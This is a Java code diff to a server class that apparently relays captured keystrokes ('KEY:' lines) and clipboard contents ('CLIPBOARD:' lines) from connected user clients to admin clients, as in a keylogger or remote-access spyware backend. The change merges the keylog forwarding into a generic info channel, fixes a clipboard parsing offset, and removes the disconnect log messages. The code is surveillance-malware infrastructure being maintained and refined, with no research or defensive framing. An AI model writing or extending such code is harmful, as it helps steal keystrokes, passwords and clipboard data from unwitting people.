@@ -109,10 +109,11 @@ public class Server {
                         String info = clientName + ": " + inputLine.substring(5);
                         sendSystemInfoToAdmins(info);
                     } else if (inputLine.startsWith("CLIPBOARD:")) {
-                        String info = clientName + ": " + inputLine.substring(90000);
+                        String info = clientName + ": " + inputLine.substring(10);
                         sendSystemInfoToAdmins(info);
                     } else if (inputLine.startsWith("KEY:")) {
-                        sendKeyLogToAdmins(clientName, inputLine);
+                        String info = clientName + ": " + inputLine.substring(4);
+                        sendSystemInfoToAdmins(info);
                     }
                 }
             } catch (IOException e) {
@@ -123,7 +124,6 @@ public class Server {
                     synchronized (userConnectedIPs) {
                         userConnectedIPs.remove(clientIP);
                     }
-                    System.out.println(clientName + " disconnected.");
                     userClients.remove(this);
                 } catch (IOException e) {
                     System.err.println("Error: " + e.getMessage());
@@ -141,14 +141,6 @@ public class Server {
             synchronized (systemInfo) {
                 for (AdminHandler admin : adminClients) {
                     admin.sendSystemInfo(info);
-                }
-            }
-        }
-        
-        private void sendKeyLogToAdmins(String clientName, String keyLog) {
-            synchronized (adminClients) {
-                for (AdminHandler admin : adminClients) {
-                    admin.sendKeyLog(clientName, keyLog);
                 }
             }
         }
@@ -214,7 +206,6 @@ public class Server {
                     synchronized (adminConnectedIPs) {
                         adminConnectedIPs.remove(clientIP);
                     }
-                    System.out.println("Admin client disconnected.");
                     adminClients.remove(this);
                 } catch (IOException e) {
                     System.err.println("Error: " + e.getMessage());
@@ -229,10 +220,6 @@ public class Server {
                 }
             }
         }
-        
-         public void sendKeyLog(String clientName, String keyLog) {
-            out.println(clientName + ": " + keyLog);
-         }
 
         public void sendSystemInfo(String info) {
             if (out != null) {
